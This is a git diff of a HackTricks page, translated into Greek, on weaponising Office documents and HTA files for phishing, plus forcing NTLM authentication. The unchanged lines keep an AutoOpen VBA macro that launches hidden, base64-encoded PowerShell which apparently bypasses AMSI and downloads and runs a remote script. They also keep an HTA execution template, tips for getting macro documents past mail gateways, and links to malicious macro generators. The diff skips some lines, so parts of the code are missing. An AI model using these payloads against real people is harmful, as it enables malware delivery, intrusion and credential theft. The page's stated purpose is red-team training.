@@ -1,50 +1,53 @@
-# Αρχεία και Έγγραφα Φισίνγκ
+# Phishing Files & Documents
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΛΑΝΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Έγγραφα Γραφείου
+## Office Documents
 
-Το Microsoft Word πραγματοποιεί επικύρωση δεδομένων αρχείου πριν ανοίξει ένα αρχείο. Η επικύρωση δεδομένων πραγματοποιείται στη μορφή αναγνώρισης δομής δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Εάν συμβεί οποιοδήποτε σφάλμα κατά την αναγνώριση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοίξει.
+Το Microsoft Word εκτελεί επικύρωση δεδομένων αρχείου πριν ανοίξει ένα αρχείο. Η επικύρωση δεδομένων εκτελείται με τη μορφή αναγνώρισης δομής δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Εάν προκύψει οποιοδήποτε σφάλμα κατά την αναγνώριση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοίξει.
 
-Συνήθως, τα αρχεία Word που περιέχουν μακρόχρονες χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατό να μετονομάσετε το αρχείο αλλάζοντας την επέκταση του αρχείου και να διατηρήσετε τις δυνατότητες εκτέλεσης των μακρόχρονων.\
-Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει μακρόχρονες, κατά σχεδιασμό, αλλά ένα αρχείο DOCM που μετονομάζεται σε RTF θα χειριστείται από το Microsoft Word και θα είναι ικανό για εκτέλεση μακρόχρονων.\
-Οι ίδιες εσωτερικές δομές και μηχανισμοί ισχύουν για όλο το λογισμικό της σουίτας Microsoft Office (Excel, PowerPoint κ.λπ.).
+Συνήθως, τα αρχεία Word που περιέχουν μακροεντολές χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατόν να μετονομάσετε το αρχείο αλλάζοντας την επέκταση του αρχείου και να διατηρήσετε τις δυνατότητες εκτέλεσης μακροεντολών.\
+Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει μακροεντολές, εκ του σχεδιασμού, αλλά ένα αρχείο DOCM που μετονομάζεται σε RTF θα διαχειρίζεται από το Microsoft Word και θα είναι ικανό για εκτέλεση μακροεντολών.\
+Οι ίδιες εσωτερικές διαδικασίες και μηχανισμοί ισχύουν για όλα τα λογισμικά της σουίτας Microsoft Office (Excel, PowerPoint κ.λπ.).
 
-Μπορείτε να χρησιμοποιήσετε την παρακάτω εντολή για να ελέγξετε ποιες επεκτάσεις θα εκτελεστούν από ορισμένα προγράμματα Office:
+Μπορείτε να χρησιμοποιήσετε την παρακάτω εντολή για να ελέγξετε ποιες επεκτάσεις θα εκτελούνται από ορισμένα προγράμματα Office:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-Τα αρχεία DOCX που αναφέρονται σε απομακρυσμένο πρότυπο (Αρχείο - Επιλογές - Πρόσθετα - Διαχείριση: Πρότυπα - Πήγαινε) που περιλαμβάνει μακρό μπορούν επίσης να "εκτελέσουν" μακρό.
+DOCX αρχεία που αναφέρονται σε ένα απομακρυσμένο πρότυπο (Αρχείο – Επιλογές – Προσθήκες – Διαχείριση: Πρότυπα – Μετάβαση) που περιλαμβάνει μακροεντολές μπορούν επίσης να “εκτελούν” μακροεντολές.
 
 ### Φόρτωση Εξωτερικής Εικόνας
 
-Πηγαίνετε σε: _Εισαγωγή -> Γρήγορα Μέρη -> Πεδίο_\
-_**Κατηγορίες**: Συνδέσμοι και Αναφορές, **Ονόματα πεδίων**: includePicture, και **Όνομα αρχείου ή URL**: http://\<ip>/whatever
+Μεταβείτε: _Εισαγωγή --> Γρήγορα Μέρη --> Πεδίο_\
+_**Κατηγορίες**: Σύνδεσμοι και Αναφορές, **Ονόματα πεδίων**: includePicture, και **Όνομα αρχείου ή URL**:_ http://\<ip>/whatever
 
-![](<../../.gitbook/assets/image (316).png>)
+![](<../../.gitbook/assets/image (155).png>)
 
-### Παρασκήνιο Μακρό
+### Μακροεντολές Πίσω Πόρτα
 
-Είναι δυνατόν να χρησιμοποιηθούν μακρό για να εκτελέσουν αυθαίρετο κώδικα από το έγγραφο.
+Είναι δυνατόν να χρησιμοποιηθούν μακροεντολές για να εκτελούν αυθαίρετο κώδικα από το έγγραφο.
 
-#### Λειτουργίες Αυτόματης Φόρτωσης
+#### Λειτουργίες Αυτοφόρτωσης
 
-Όσο πιο κοινές είναι, τόσο πιο πιθανό είναι να τις ανιχνεύσει ο Αντιιικός Λογισμικός.
+Όσο πιο κοινές είναι, τόσο πιο πιθανό είναι να τις ανιχνεύσει το AV.
 
 * AutoOpen()
 * Document\_Open()
 
-#### Παραδείγματα Κώδικα Μακρό
+#### Παραδείγματα Κώδικα Μακροεντολών
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -74,26 +77,26 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
-#### Χειροκίνητη αφαίρεση μεταδεδομένων
+#### Manually remove metadata
 
-Πηγαίνετε σε **Αρχείο > Πληροφορίες > Επιθεώρηση εγγράφου > Επιθεώρηση εγγράφου**, το οποίο θα εμφανίσει τον Επιθεωρητή Εγγράφου. Κάντε κλικ στο **Επιθεώρηση** και στη συνέχεια στο **Αφαίρεση όλων** δίπλα στις **Ιδιότητες εγγράφου και προσωπικές πληροφορίες**.
+Πηγαίνετε στο **File > Info > Inspect Document > Inspect Document**, το οποίο θα φέρει τον Document Inspector. Κάντε κλικ στο **Inspect** και στη συνέχεια στο **Remove All** δίπλα από **Document Properties and Personal Information**.
 
-#### Επέκταση αρχείου
+#### Doc Extension
 
-Όταν τελειώσετε, επιλέξτε την αναπτυσσόμενη λίστα **Αποθήκευση ως τύπος**, αλλάξτε τη μορφή από **`.docx`** σε **Word 97-2003 `.doc`**.\
-Κάντε αυτό επειδή **δεν μπορείτε να αποθηκεύσετε μακροεντολές μέσα σε ένα `.docx`** και υπάρχει μια **στίγμα** γύρω από την επέκταση των μακροεντολών **`.docm`** (π.χ. το εικονίδιο μικρογραφίας έχει ένα τεράστιο `!` και ορισμένες πύλες ιστού/ηλεκτρονικού ταχυδρομείου τις αποκλείουν εντελώς). Επομένως, αυτή η **παλαιά επέκταση `.doc` είναι η καλύτερη συμβιβαστική λύση**.
+Όταν τελειώσετε, επιλέξτε το αναπτυσσόμενο μενού **Save as type**, αλλάξτε τη μορφή από **`.docx`** σε **Word 97-2003 `.doc`**.\
+Κάντε το αυτό γιατί **δεν μπορείτε να αποθηκεύσετε μακροεντολές μέσα σε ένα `.docx`** και υπάρχει ένα **στίγμα** **γύρω** από την μακροεντολή-ενεργοποιημένη **`.docm`** επέκταση (π.χ. το εικονίδιο μικρογραφίας έχει ένα τεράστιο `!` και ορισμένες πύλες ιστού/ηλεκτρονικού ταχυδρομείου τις μπλοκάρουν εντελώς). Επομένως, αυτή η **παλαιά επέκταση `.doc` είναι η καλύτερη συμβιβαστική λύση**.
 
-#### Δημιουργοί κακόβουλων μακροεντολών
+#### Malicious Macros Generators
 
 * MacOS
 * [**macphish**](https://github.com/cldrn/macphish)
 * [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## Αρχεία HTA
+## HTA Files
 
-Ένα αρχείο HTA είναι ένα πρόγραμμα των Windows που **συνδυάζει HTML και γλώσσες σεναρίου (όπως VBScript και JScript)**. Δημιουργεί τη διεπαφή χρήστη και εκτελείται ως μια "πλήρως αξιόπιστη" εφαρμογή, χωρίς τους περιορισμούς του μοντέλου ασφαλείας ενός προγράμματος περιήγησης.
+Ένα HTA είναι ένα πρόγραμμα Windows που **συνδυάζει HTML και γλώσσες scripting (όπως VBScript και JScript)**. Δημιουργεί τη διεπαφή χρήστη και εκτελείται ως μια "πλήρως αξιόπιστη" εφαρμογή, χωρίς τους περιορισμούς του μοντέλου ασφάλειας ενός προγράμματος περιήγησης.
 
-Ένα αρχείο HTA εκτελείται χρησιμοποιώντας το **`mshta.exe`**, το οποίο συνήθως **εγκαθίσταται** μαζί με το **Internet Explorer**, καθιστώντας το **`mshta` εξαρτημένο από το IE**. Έτσι, αν έχει απεγκατασταθεί, τα αρχεία HTA δεν θα μπορούν να εκτελεστούν.
+Ένα HTA εκτελείται χρησιμοποιώντας **`mshta.exe`**, το οποίο είναι συνήθως **εγκατεστημένο** μαζί με **Internet Explorer**, καθιστώντας το **`mshta` εξαρτώμενο από το IE**. Έτσι, αν έχει απεγκατασταθεί, τα HTA δεν θα μπορούν να εκτελούνται.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -148,11 +151,11 @@ var_func
 self.close
 </script>
 ```
-## Εξαναγκασμός Ταυτοποίησης NTLM
+## Forcing NTLM Authentication
 
-Υπάρχουν αρκετοί τρόποι για να **εξαναγκάσετε την ταυτοποίηση NTLM "απομακρυσμένα"**, για παράδειγμα, μπορείτε να προσθέσετε **αόρατες εικόνες** σε emails ή HTML που ο χρήστης θα αποκτήσει πρόσβαση (ακόμα και HTTP MitM;). Ή να στείλετε στο θύμα τη **διεύθυνση αρχείων** που θα **ενεργοποιήσει** μια **ταυτοποίηση** μόνο για το **άνοιγμα του φακέλου**.
+Υπάρχουν αρκετοί τρόποι για να **αναγκάσετε την NTLM αυθεντικοποίηση "απομακρυσμένα"**, για παράδειγμα, θα μπορούσατε να προσθέσετε **αόρατες εικόνες** σε emails ή HTML που θα έχει πρόσβαση ο χρήστης (ακόμα και HTTP MitM;). Ή να στείλετε το θύμα τη **διεύθυνση αρχείων** που θα **ενεργοποιήσουν** μια **αυθεντικοποίηση** μόνο για **άνοιγμα του φακέλου.**
 
-**Ελέγξτε αυτές τις ιδέες και περισσότερα στις παρακάτω σελίδες:**
+**Ελέγξτε αυτές τις ιδέες και περισσότερες στις επόμενες σελίδες:**
 
 {% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
 [printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
@@ -164,19 +167,22 @@ self.close
 
 ### NTLM Relay
 
-Μην ξεχάσετε ότι μπορείτε όχι μόνο να κλέψετε το hash ή την ταυτοποίηση αλλά και να **εκτελέσετε επιθέσεις NTLM relay**:
+Μην ξεχνάτε ότι δεν μπορείτε μόνο να κλέψετε το hash ή την αυθεντικοποίηση αλλά και να **εκτελέσετε επιθέσεις NTLM relay**:
 
-* [**Επιθέσεις NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
+* [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 * [**AD CS ESC8 (NTLM relay σε πιστοποιητικά)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
